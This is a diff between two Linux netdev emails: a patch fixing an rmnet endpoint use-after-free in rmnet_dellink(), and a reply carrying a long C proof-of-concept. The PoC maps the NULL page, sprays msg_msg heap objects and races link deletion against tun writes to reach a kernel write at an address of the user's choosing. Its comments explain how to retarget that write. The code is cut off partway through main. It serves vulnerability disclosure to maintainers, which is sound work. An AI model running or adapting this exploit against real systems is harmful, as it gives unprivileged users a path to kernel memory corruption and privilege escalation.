@@ -1,152 +1,522 @@
-Received: from mail-dy1-f175.google.com (mail-dy1-f175.google.com [74.125.82.175])
+Received: from mail-pf1-f182.google.com (mail-pf1-f182.google.com [209.85.210.182])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 31573374722
-	for <netdev@vger.kernel.org>; Mon, 11 May 2026 12:11:42 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.175
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6C1E8377020
+	for <netdev@vger.kernel.org>; Mon, 11 May 2026 12:15:18 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.182
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1778501503; cv=none; b=THYV400Kkdm5WW3oIIJbubyf5iwAZXSFQUs8LMpUjjHxxDO6Zyw/rt1SW4ZBr5lQh6UPTjsHpFDOi442ofLjRLo0DWVlI3N0S1D9zcHKH2ImWPql4PEV7cjq7Do0J4bVxOGsJrMcnrBchBz5vGrTh9LqFlXmH7GUlmeTh5PjjOg=
+	t=1778501720; cv=none; b=FeqkwQCGaPx6kItQXZzLfnTzxS74yBndUoqhj9dRBdCEyA0SnyGheLAGH+fP7HBz5bY289oMWtb9Pn21KU3UH6yPG9h+5JHu3zRzdrv20+i1d7E5JlmOKT08YTkDLNlTWQV/U0aDoAQ9CqqPLW68BR3/+t3+0AT0NKx9NoWVgJw=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1778501503; c=relaxed/simple;
-	bh=zDIDQFn+g9lckgjVKIk0P2Ns1wxOnHnQ78kGDl4X6wg=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=sO7J0nRmyGUJYbdgEE5Ud4y6d/h1qyDXA87nzFTVfpw1ELWFV2wXMBx/JgCIsNiU2u3SKVh3bnVrWPl0G64g3VQVKz43dqZBhanJSbLE0N68X9gJifbTyqUzrxCglhUWX/eOFNWL4TQWmcYwksUaGBPTakEbTqr5LBLSU7e+pkQ=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=haM7+ffl; arc=none smtp.client-ip=74.125.82.175
+	s=arc-20240116; t=1778501720; c=relaxed/simple;
+	bh=5+rvnBJRXhablZFaQKtpJcp3j0mpm8JdiLBVQ7VG6Vc=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=JKPM0p1nJpXepwpQo7ci+mGb9M8bwKN1mXXELv6ZOHy2QTb1vrsnBZtwfPzL5mPbsLiYNJ2qcA1VC3N6yhEyyOKbtP7qH74dMuCZgwFFS9b5LDwQ1Nw0H0Df9jBRXjTMyX69Zzr4gMbjO10LUdPvY1/y15ozL5T5BolzQ493D80=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=eUPh/9iy; arc=none smtp.client-ip=209.85.210.182
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="haM7+ffl"
-Received: by mail-dy1-f175.google.com with SMTP id 5a478bee46e88-2ecf9e398f4so11340928eec.1
-        for <netdev@vger.kernel.org>; Mon, 11 May 2026 05:11:42 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="eUPh/9iy"
+Received: by mail-pf1-f182.google.com with SMTP id d2e1a72fcca58-82f8893bff3so1864001b3a.2
+        for <netdev@vger.kernel.org>; Mon, 11 May 2026 05:15:18 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1778501501; x=1779106301; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to;
-        bh=hs534S+X0dZVP+pvepgGG5haFKXdeP4FpqB4r44PpkE=;
-        b=haM7+fflD4Y/IpjRB0Ehsf1mr1MI0cSEFL4cSyeTXJ3dtzd5t2OgKL19R+GA2Mzn7O
-         xmWo6dCdpj1Rjfc1/1fl7pgdcLj34OpJMMIHwDDPC60iSbaUC3+Y5VJh0X9NRhjQi/qp
-         Q04et4p5BdKDfhvEz5yC3sD4V5OPsexobBdQ+4u6bMZbofMLZXoljWMD1BBMLltSKG1X
-         +OTCoDW9hLMHpUt9usUZoK6ignNdvJKm7RVHLMnT48DDwqiqX7BkEEdOm8xgD89BFBwz
-         Hw5+X26VSLpX7XrePqm0YSix6KMbeqR8XljEyQZvkmOGNg4thRUVaPWJaBU/rdA5BvYO
-         szOA==
+        d=gmail.com; s=20251104; t=1778501718; x=1779106518; darn=vger.kernel.org;
+        h=in-reply-to:content-transfer-encoding:content-disposition
+         :mime-version:references:message-id:subject:cc:to:from:date:from:to
+         :cc:subject:date:message-id:reply-to;
+        bh=d3g8LwNBS72SFnq5uFpy5PV6ZibvoViFc2H3LTOrRTM=;
+        b=eUPh/9iyzzBI2vHmHE3Wa/hf9UffRTqle8b6bToroqP9T0DHvcHcT9bVaSDs1J7/Ia
+         26C5l8UGkE7GOHgDfynLMtprx7mjX1yP8NX0dV5pzdWltMPR5AsVcqkaNmfaOyPMNSRM
+         D4HA1iE4uYBpYn38S6z6hnfeuoEckba7Es1Oh4wEgCsU8LhLdnAs3NvxlC/K3PuoXGv+
+         gNtm3zQtxP61zvWj9qcTEGPwJb5/u6bMxsbzNR+X+PwFiRUpBDOn1Fli07WedhmMODCX
+         Qe2DqPh5AZUvTpIiPt3abhaYVicPWFdG7CP8kdrs+/jGXZsKEU2K43bzwW+QzMoWwC2Y
+         kKkQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1778501501; x=1779106301;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=hs534S+X0dZVP+pvepgGG5haFKXdeP4FpqB4r44PpkE=;
-        b=iQvX2dDGmJeeGP45BMlE2q8rhrmzFNnxpzrjCfGm2TGbK/NKKshcCE6hIiv0drjkBb
-         rFLXGYG+5ydpY1C6TvUmSER6ZF1UNneEyk7p6q++euYmdkNF7Yv0M/9Bf5Mr2ZHnpOUM
-         goc8Eoo2LS3CyAgmFW6OeA2qmqMe4qLlZsZDhFmIi1Raiu4EkJzccgifibKx5mc+PgJF
-         zC68l3xnfVFq2hbKDEScD9Yo3eH2EqtchoGpBsJAvTPPuUXr8S9DUkdID2GoCuvOvLbF
-         qcPw72fe32lwq4I5bsBwXOYTUAkIa1T2J0s+Km00jz3Sig2htIPCn7wnQpj13F9KTSdK
-         rWPg==
-X-Gm-Message-State: AOJu0YzgjjtgLhcUEZlsd9m4mdAmWsm0Q16i+gkpdJ5yxd5yNus0Hyu0
-	cwcZLAplaRamn1MZhnKt38i7NURho4XTXSCjcazjkmx3ooVMgwnXYc+R
-X-Gm-Gg: Acq92OElTwR57NPea8N0Uwp4qkAoW4qPUrEBmzmUW39H5DXRVrwmmdAT23diAx/hH9k
-	vXafoA6tUzzEEW6Jr+CnK7m8gK3w+Gev6rdy7NHrGYGnVkx5Soka1uHQ9gMtGwawF4AdWbfj2S0
-	GYAnHrbkXr2tYe6dPEOQYgi2s+Eg/PFThp519bROuw+SbAZEvcrwg4kiklmFqR0aYqSBE7Uf0qH
-	p9ShaXYYXK6f4rHTGVLWJHQ8HDyDiOwNuf5y7l5hetYIvnugQvgASmeQocfdqlAUW33GTbtVlTo
-	zxL0Qw0CoYoEPgW0V/647hoWfrnXN8eof2CBScZoIGD9EkkrMl74y72SrcLQw7g9VBziJgSWce9
-	BqxK3HnpSL2Gxq11q5iFPpMH/guEALbJthrN5OyEDmoR6BoyNaWXimq0vVL0gA8tFDLMSdIi740
-	VpGa3g4Lx/GY988CutqDjmGOx9Fi+Z+Yx8U16b4Z9DinM01q0doSG9VXFCB9Q9bWx5hw5gr2pJh
-	w+6/EsI5Em/upofQF3o
-X-Received: by 2002:a05:693c:2b08:b0:2ea:5057:a304 with SMTP id 5a478bee46e88-2f54ad72533mr11567414eec.2.1778501501090;
-        Mon, 11 May 2026 05:11:41 -0700 (PDT)
-Received: from efaec68ba852.tailc0aff1.ts.net ([206.206.192.132])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2f888e381c9sm12879102eec.26.2026.05.11.05.11.39
+        d=1e100.net; s=20251104; t=1778501718; x=1779106518;
+        h=in-reply-to:content-transfer-encoding:content-disposition
+         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=d3g8LwNBS72SFnq5uFpy5PV6ZibvoViFc2H3LTOrRTM=;
+        b=KVKxKlDvYkA/Vgzs9i5iZBB9yWX3wfizpD85/m9FNuloyvF05aZlcoup5+2t+tamaR
+         iUI/rYLL3lRM5RgUcNeBCD7ozmVJyp1qpZf0YjeWAlXE/FMVky7zzMKbIkGhmRonshop
+         Qzt4gjIuXAPj6dyyt7xoNCD7Rs2UGQLMRcD03UaxF2wwO0bLZb7KsbOubuWq4zcpFQBA
+         +LgXj7EM5zyajFReSE8v92zlXu9fyMjsNbP5v4a/zQt0YuAKMAkHYBolMhZ1lJBSbAIY
+         3sDqlBeuFvHMns4ftYzXPVPVea43JngNiNERZzcAsmLnaxm3pmmPutDuOUJdYeeUTxWZ
+         3yCA==
+X-Gm-Message-State: AOJu0YzOWsetdPEKVFdGJa/DCu/+Za6s3TDIMX30fJ0lco/GhVvgSNny
+	LLTpCFdEq5GRdEOTNXV6gIaCQFHZWB24SJY/bS93Q7kCzvdr8zD23CXY
+X-Gm-Gg: Acq92OFK8fidSEvVAd999YWxSETuhmeFV3Ad/NEcfbsh0mdepNUynyClGpVV7bIkMJk
+	ojzCdkXMociK4TDt+d1cW2e32kYsvq/XuWhcsCQGgBAFA/D4eImIhNmKkYiouhrAdZ0RAP2OfEX
+	FyRb+lmTZo1jq3RNImDdgjtkzj2TpqTmrh1krjIZjItV6wpd/0VNw4UQkGdQW4Ub8xtVCU628jc
+	DVTjJ5vffOvWmRiAsULH/N8G10TD155Ys10NtHwrUNTz3pXCbpYwgEu8O3kzPUi2iL0qRuDg1nZ
+	Ap3Cena/ir0jFn9hqY4U65br6ixh53IdhOyCZNp7qfC9FbN+H/8az8vwKhcrYm91Kv2n1SPArt9
+	97PY4lRzo+WMavhxL8/iIWCs1imLxkIFLK2R3S7Srdckrn+HD35optuvyXfvsnzIAi2Wz6rdwgt
+	dNeWnWU8OzX33/17Sfope9jFXod9SM5gx4DvS6KjOcVJKgUJxL8sMV0xTOkOr2aA==
+X-Received: by 2002:a05:6a00:194e:b0:82c:d7c4:4c56 with SMTP id d2e1a72fcca58-83e39d40202mr8729694b3a.15.1778501717366;
+        Mon, 11 May 2026 05:15:17 -0700 (PDT)
+Received: from Air.local ([198.176.50.157])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-839682abd39sm20740359b3a.52.2026.05.11.05.15.13
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Mon, 11 May 2026 05:11:40 -0700 (PDT)
+        Mon, 11 May 2026 05:15:16 -0700 (PDT)
+Date: Mon, 11 May 2026 20:15:10 +0800
 From: Weiming Shi <bestswngs@gmail.com>
-To: Subash Abhinov Kasiviswanathan <subash.a.kasiviswanathan@oss.qualcomm.com>,
-	Sean Tranchetti <sean.tranchetti@oss.qualcomm.com>,
-	Andrew Lunn <andrew+netdev@lunn.ch>,
-	"David S . Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>
-Cc: netdev@vger.kernel.org,
-	Xiang Mei <xmei5@asu.edu>,
-	Weiming Shi <bestswngs@gmail.com>
-Subject: [PATCH] net: qualcomm: rmnet: fix endpoint use-after-free in rmnet_dellink()
-Date: Mon, 11 May 2026 05:00:18 -0700
-Message-ID: <20260511120015.2298403-4-bestswngs@gmail.com>
-X-Mailer: git-send-email 2.43.0
+To: Subash Abhinov Kasiviswanathan <subash.a.kasiviswanathan@oss.qualcomm.com>, 
+	Sean Tranchetti <sean.tranchetti@oss.qualcomm.com>, Andrew Lunn <andrew+netdev@lunn.ch>, 
+	"David S . Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, 
+	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>
+Cc: netdev@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
+Subject: Re: [PATCH] net: qualcomm: rmnet: fix endpoint use-after-free in
+ rmnet_dellink()
+Message-ID: <agHIOLmkPnn-FxHr@Air.local>
+References: <20260511120015.2298403-4-bestswngs@gmail.com>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: inline
 Content-Transfer-Encoding: 8bit
+In-Reply-To: <20260511120015.2298403-4-bestswngs@gmail.com>
 
-From: Security Analysis <xmei5@asu.edu>
 
-rmnet_dellink() removes the endpoint from the hash table with
-hlist_del_init_rcu() and then immediately frees it with kfree(). However,
-RCU readers on the receive path (rmnet_rx_handler ->
-__rmnet_map_ingress_handler) may still hold a reference to the endpoint and
-dereference ep->egress_dev after the memory has been freed. The endpoint is
-a kmalloc-32 object, and the stale read at offset 8 corresponds to the
-egress_dev pointer.
+Thanks for your attention to this bug. Here are some resources to help
+you trigger the bug.
 
-  BUG: unable to handle page fault for address: ffffffffde942eef
-  Oops: 0002 [#1] SMP NOPTI
-  CPU: 1 UID: 0 PID: 137 Comm: poc_write Not tainted 7.0.0+ #4 PREEMPTLAZY
-  RIP: 0010:rmnet_vnd_rx_fixup (rmnet_vnd.c:27)
-  Call Trace:
-   <TASK>
-   __rmnet_map_ingress_handler (rmnet_handlers.c:48 rmnet_handlers.c:101)
-   rmnet_rx_handler (rmnet_handlers.c:129 rmnet_handlers.c:235)
-   __netif_receive_skb_core.constprop.0 (net/core/dev.c:6096)
-   __netif_receive_skb_one_core (net/core/dev.c:6208)
-   netif_receive_skb (net/core/dev.c:6467)
-   tun_get_user (drivers/net/tun.c:1955)
-   tun_chr_write_iter (drivers/net/tun.c:2003)
-   vfs_write (fs/read_write.c:688)
-   ksys_write (fs/read_write.c:740)
-   </TASK>
+Required key configs for the poc:
 
-Replace kfree() with kfree_rcu_mightsleep() so the endpoint memory remains
-valid through the RCU grace period. Also remove the rmnet_vnd_dellink() call
-and inline only the nr_rmnet_devs decrement, since rmnet_vnd_dellink() would
-set ep->egress_dev to NULL during the grace period, creating a data race with
-lockless readers.
+CONFIG_USER_NS=y
+kernel.unprivileged_userns_clone=1
 
-Fixes: ceed73a2cf4a ("drivers: net: ethernet: qualcomm: rmnet: Initial implementation")
-Assisted-by: Claude:claude-opus-4-7
-Reported-by: Xiang Mei <xmei5@asu.edu>
-Signed-off-by: Weiming Shi <bestswngs@gmail.com>
----
- drivers/net/ethernet/qualcomm/rmnet/rmnet_config.c | 8 ++++----
- 1 file changed, 4 insertions(+), 4 deletions(-)
 
-diff --git a/drivers/net/ethernet/qualcomm/rmnet/rmnet_config.c b/drivers/net/ethernet/qualcomm/rmnet/rmnet_config.c
-index 269c0449760c..2e17a43aec5a 100644
---- a/drivers/net/ethernet/qualcomm/rmnet/rmnet_config.c
-+++ b/drivers/net/ethernet/qualcomm/rmnet/rmnet_config.c
-@@ -213,8 +213,8 @@ static void rmnet_dellink(struct net_device *dev, struct list_head *head)
- 	ep = rmnet_get_endpoint(real_port, mux_id);
- 	if (ep) {
- 		hlist_del_init_rcu(&ep->hlnode);
--		rmnet_vnd_dellink(mux_id, real_port, ep);
--		kfree(ep);
-+		real_port->nr_rmnet_devs--;
-+		kfree_rcu_mightsleep(ep);
- 	}
- 
- 	netdev_upper_dev_unlink(real_dev, dev);
-@@ -238,9 +238,9 @@ static void rmnet_force_unassociate_device(struct net_device *real_dev)
- 		hash_for_each_safe(port->muxed_ep, bkt_ep, tmp_ep, ep, hlnode) {
- 			unregister_netdevice_queue(ep->egress_dev, &list);
- 			netdev_upper_dev_unlink(real_dev, ep->egress_dev);
--			rmnet_vnd_dellink(ep->mux_id, port, ep);
- 			hlist_del_init_rcu(&ep->hlnode);
--			kfree(ep);
-+			port->nr_rmnet_devs--;
-+			kfree_rcu_mightsleep(ep);
- 		}
- 		rmnet_unregister_real_device(real_dev);
- 		unregister_netdevice_many(&list);
--- 
-2.43.0
+Here is a PoC trigger that causes the intended crash shown in the
+commit message:
+```
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/if_ether.h>
+#include <linux/if_tun.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <net/if.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/ipc.h>
+#include <sys/mman.h>
+#include <sys/msg.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#ifndef ETH_P_MAP
+#define ETH_P_MAP 0x00F9
+#endif
+
+#ifndef RMNET_FLAGS_INGRESS_DEAGGREGATION
+#define RMNET_FLAGS_INGRESS_DEAGGREGATION (1U << 0)
+#endif
+
+enum {
+        _IFLA_RMNET_UNSPEC,
+        _IFLA_RMNET_MUX_ID,
+        _IFLA_RMNET_FLAGS,
+        ___IFLA_RMNET_MAX,
+};
+struct _ifla_rmnet_flags { uint32_t flags; uint32_t mask; };
+
+#ifndef IFLA_INFO_KIND
+#define IFLA_INFO_KIND 1
+#define IFLA_INFO_DATA 2
+#endif
+
+#define NL_BUFSZ    4096
+#define TUN_NAME    "tunrm0"
+#define KEEP_NAME   "rmkeep0"
+#define VICTIM_NAME "rmvict0"
+#define KEEP_MUX    2
+#define VICTIM_MUX  1
+#define NUM_WRITERS 4
+
+/*
+ * Offset of priv->pcpu_stats when dev=NULL:
+ *   netdev_priv(NULL) = ALIGN(sizeof(struct net_device), 32)
+ *   On this kernel build: 0xa00
+ *   pcpu_stats is at offsetof(rmnet_priv, pcpu_stats) = 0x10
+ *   So priv->pcpu_stats is at address 0xa10
+ *
+ * Determined from crash output:
+ *   CR2: 0000000000000a10
+ *   Code: <48> 8b 86 10 0a 00 00  →  mov rax, [rsi + 0xa10]
+ */
+#define NETDEV_PRIV_OFFSET   0xa00
+#define PCPU_STATS_OFFSET    0x10
+#define NULL_PAGE_TARGET     (NETDEV_PRIV_OFFSET + PCPU_STATS_OFFSET) /* 0xa10 */
+
+/*
+ * To write at an arbitrary kernel address T:
+ *   *(0xa10) = T - per_cpu_offset
+ *   per_cpu_offset is read from GS base at runtime.
+ *
+ * Default target: 0xffffffffdeadbeef (unmapped → page fault proves control)
+ * Change WRITE_TARGET to any mapped kernel address for a silent write.
+ */
+#define WRITE_TARGET         0xffffffffdeadbeefULL
+#define PERCPU_OFFSET        0xffff8880f81df000ULL  /* CPU1 on this QEMU build */
+#define PCPU_MARKER          ((WRITE_TARGET - PERCPU_OFFSET) & 0xffffffffffffffffULL)
+
+/* Heap spray: msg_msgseg marker for the egress_dev pointer */
+#define SPRAY_MARKER         0x4141414141414141ULL
+
+/* --- Heap spray parameters --- */
+#define MSG_MSG_SZ_MAX  48
+#define DATALEN_MSG     (4096 - MSG_MSG_SZ_MAX)
+#define SEG_DATA_SZ     24
+#define MSG_TOTAL_SZ    (DATALEN_MSG + SEG_DATA_SZ)
+#define SPRAY_COUNT     128
+
+struct spray_msg {
+        long mtype;
+        char mtext[MSG_TOTAL_SZ];
+};
+
+struct rmnet_map_hdr {
+        uint8_t  flags;
+        uint8_t  mux_id;
+        uint16_t pkt_len;
+} __attribute__((packed));
+
+static volatile int g_stop = 0;
+static int spray_qid = -1;
+static struct spray_msg *spray_buf;
+static struct spray_msg *recv_buf;
+
+static void pin_cpu(int cpu)
+{
+        cpu_set_t s;
+        CPU_ZERO(&s);
+        CPU_SET(cpu, &s);
+        sched_setaffinity(0, sizeof(s), &s);
+}
+
+static uint16_t ip_csum(const void *b, size_t l)
+{
+        const uint16_t *p = b;
+        uint32_t s = 0;
+        while (l > 1) { s += *p++; l -= 2; }
+        if (l) s += *(const uint8_t *)p;
+        while (s >> 16) s = (s & 0xffff) + (s >> 16);
+        return ~s;
+}
+
+/* --- NULL page mapping --- */
+
+static void setup_null_page(void)
+{
+        FILE *f;
+
+        f = fopen("/proc/sys/vm/mmap_min_addr", "w");
+        if (f) {
+                fprintf(f, "0\n");
+                fclose(f);
+        } else {
+                fprintf(stderr, "WARNING: cannot set mmap_min_addr=0\n");
+        }
+
+        /*
+         * Map page 0 so that when skb->dev=NULL, the kernel can read
+         * through netdev_priv(NULL) without faulting (requires nosmap).
+         *
+         * At offset 0xa10, place a controlled pcpu_stats pointer.
+         * The kernel does: this_cpu_ptr(*(0xa10)) → write at controlled addr.
+         */
+        void *p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                       MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
+                       -1, 0);
+        if (p == MAP_FAILED) {
+                perror("mmap NULL page");
+                fprintf(stderr, "NULL page mapping failed — will rely on heap spray only\n");
+                return;
+        }
+
+        memset(p, 0, 0x1000);
+
+        /* Place controlled pcpu_stats pointer at offset 0xa10 */
+        *(uint64_t *)((char *)p + NULL_PAGE_TARGET) = PCPU_MARKER;
+
+        fprintf(stderr, "NULL page mapped. *(0x%x) = 0x%llx\n",
+                NULL_PAGE_TARGET, (unsigned long long)PCPU_MARKER);
+        fprintf(stderr, "Write target: 0x%llx (= 0x%llx + per_cpu 0x%llx)\n",
+                (unsigned long long)WRITE_TARGET,
+                (unsigned long long)PCPU_MARKER,
+                (unsigned long long)PERCPU_OFFSET);
+}
+
+/* --- Heap spray --- */
+
+static void spray_init(void)
+{
+        spray_buf = malloc(sizeof(*spray_buf));
+        recv_buf = malloc(sizeof(*recv_buf));
+        if (!spray_buf || !recv_buf) { perror("malloc spray"); exit(1); }
+
+        spray_buf->mtype = 1;
+        memset(spray_buf->mtext, 0x41, MSG_TOTAL_SZ);
+
+        spray_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+        if (spray_qid < 0) { perror("msgget"); exit(1); }
+
+        struct msqid_ds ds;
+        msgctl(spray_qid, IPC_STAT, &ds);
+        ds.msg_qbytes = SPRAY_COUNT * (MSG_TOTAL_SZ + 64);
+        msgctl(spray_qid, IPC_SET, &ds);
+}
+
+static int spray_kmalloc32(void)
+{
+        int sent = 0;
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+                if (msgsnd(spray_qid, spray_buf, MSG_TOTAL_SZ, IPC_NOWAIT) < 0)
+                        break;
+                sent++;
+        }
+        return sent;
+}
+
+static void spray_cleanup(int count)
+{
+        for (int i = 0; i < count; i++) {
+                if (msgrcv(spray_qid, recv_buf, MSG_TOTAL_SZ, 0, IPC_NOWAIT) < 0)
+                        break;
+        }
+}
+
+/* --- Netlink helpers --- */
+
+#define NLMSG_TAIL(n) \
+        ((struct rtattr *)(((char *)(n)) + NLMSG_ALIGN((n)->nlmsg_len)))
+
+static void nla_put(struct nlmsghdr *n, int t, const void *d, size_t l)
+{
+        struct rtattr *r = NLMSG_TAIL(n);
+        size_t rl = RTA_LENGTH(l);
+        r->rta_type = t;
+        r->rta_len = rl;
+        if (l) memcpy(RTA_DATA(r), d, l);
+        n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(rl);
+}
+
+static struct rtattr *nla_nest(struct nlmsghdr *n, int t)
+{
+        struct rtattr *r = NLMSG_TAIL(n);
+        nla_put(n, t, NULL, 0);
+        return r;
+}
+
+static void nla_nest_end(struct nlmsghdr *n, struct rtattr *r)
+{
+        r->rta_len = (char *)NLMSG_TAIL(n) - (char *)r;
+}
+
+static int nl_talk(int fd, struct nlmsghdr *h)
+{
+        static uint32_t seq = 100;
+        char buf[NL_BUFSZ];
+
+        h->nlmsg_seq = __atomic_fetch_add(&seq, 1, __ATOMIC_RELAXED);
+        h->nlmsg_pid = 0;
+        if (send(fd, h, h->nlmsg_len, 0) < 0) return -errno;
+
+        for (;;) {
+                ssize_t n = recv(fd, buf, sizeof(buf), 0);
+                if (n < 0) { if (errno == EINTR) continue; return -errno; }
+                struct nlmsghdr *r;
+                for (r = (void *)buf; NLMSG_OK(r, (unsigned)n); r = NLMSG_NEXT(r, n)) {
+                        if (r->nlmsg_seq != h->nlmsg_seq) continue;
+                        if (r->nlmsg_type == NLMSG_ERROR)
+                                return ((struct nlmsgerr *)NLMSG_DATA(r))->error;
+                        if (r->nlmsg_type == NLMSG_DONE) return 0;
+                }
+        }
+}
+
+/* --- Device operations --- */
+
+static int open_tun(const char *name)
+{
+        int fd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
+        if (fd < 0) { perror("tun"); exit(1); }
+        struct ifreq ifr = {};
+        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", name);
+        ifr.ifr_flags = IFF_TUN | IFF_MULTI_QUEUE;
+        if (ioctl(fd, TUNSETIFF, &ifr)) { perror("TUNSETIFF"); exit(1); }
+        return fd;
+}
+
+static void link_up(const char *name)
+{
+        int fd = socket(AF_INET, SOCK_DGRAM, 0);
+        struct ifreq ifr = {};
+        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", name);
+        ioctl(fd, SIOCGIFFLAGS, &ifr);
+        ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
+        ioctl(fd, SIOCSIFFLAGS, &ifr);
+        close(fd);
+}
+
+static int mk_rmnet(int nlfd, const char *name, const char *lower, uint16_t mux)
+{
+        struct { struct nlmsghdr h; struct ifinfomsg i; char b[NL_BUFSZ]; } rq = {};
+        unsigned idx = if_nametoindex(lower);
+        if (!idx) return -ENODEV;
+
+        rq.h.nlmsg_len = NLMSG_LENGTH(sizeof(rq.i));
+        rq.h.nlmsg_type = RTM_NEWLINK;
+        rq.h.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
+
+        nla_put(&rq.h, IFLA_IFNAME, name, strlen(name) + 1);
+        nla_put(&rq.h, IFLA_LINK, &idx, 4);
+
+        struct rtattr *li = nla_nest(&rq.h, IFLA_LINKINFO);
+        nla_put(&rq.h, IFLA_INFO_KIND, "rmnet", 6);
+        struct rtattr *id = nla_nest(&rq.h, IFLA_INFO_DATA);
+        nla_put(&rq.h, _IFLA_RMNET_MUX_ID, &mux, 2);
+        struct _ifla_rmnet_flags f = { 0, RMNET_FLAGS_INGRESS_DEAGGREGATION };
+        nla_put(&rq.h, _IFLA_RMNET_FLAGS, &f, sizeof(f));
+        nla_nest_end(&rq.h, id);
+        nla_nest_end(&rq.h, li);
+
+        return nl_talk(nlfd, &rq.h);
+}
+
+static int rm_link(int nlfd, const char *name)
+{
+        unsigned idx = if_nametoindex(name);
+        if (!idx) return -ENODEV;
+        struct { struct nlmsghdr h; struct ifinfomsg i; char b[256]; } rq = {};
+        rq.h.nlmsg_len = NLMSG_LENGTH(sizeof(rq.i));
+        rq.h.nlmsg_type = RTM_DELLINK;
+        rq.h.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+        rq.i.ifi_index = idx;
+        return nl_talk(nlfd, &rq.h);
+}
+
+/* --- Writer thread --- */
+
+static void *writer_fn(void *arg)
+{
+        int fd = *(int *)arg;
+        uint8_t pkt[64];
+        struct tun_pi *pi = (void *)pkt;
+        struct rmnet_map_hdr *rm = (void *)(pi + 1);
+        uint8_t *ip = (uint8_t *)(rm + 1);
+
+        memset(pkt, 0, sizeof(pkt));
+        pi->proto = htons(ETH_P_MAP);
+        rm->mux_id = VICTIM_MUX;
+        rm->pkt_len = htons(20);
+        ip[0] = 0x45; ip[3] = 0x14; ip[4] = 0x12; ip[5] = 0x34;
+        ip[8] = 0x40; ip[9] = 0xfd;
+        ip[12] = 0x0a; ip[15] = 1; ip[16] = 0x0a; ip[19] = 2;
+        *(uint16_t *)(ip + 10) = ip_csum(ip, 20);
+        size_t len = sizeof(*pi) + sizeof(*rm) + 20;
+
+        pin_cpu(1);
+
+        while (!__atomic_load_n(&g_stop, __ATOMIC_RELAXED)) {
+                for (int i = 0; i < 64; i++)
+                        write(fd, pkt, len);
+        }
+        return NULL;
+}
+
+int main(void)
+{
+        int nlfd, tun_fds[NUM_WRITERS];
+        pthread_t tids[NUM_WRITERS];
+        uint64_t iter = 0;
+        int spray_sent;
+
+        fprintf(stderr,
+                "=== rmnet endpoint RCU UAF → controlled write PoC ===\n\n"
+                "Write chain: ep->egress_dev → skb->dev → netdev_priv()\n"
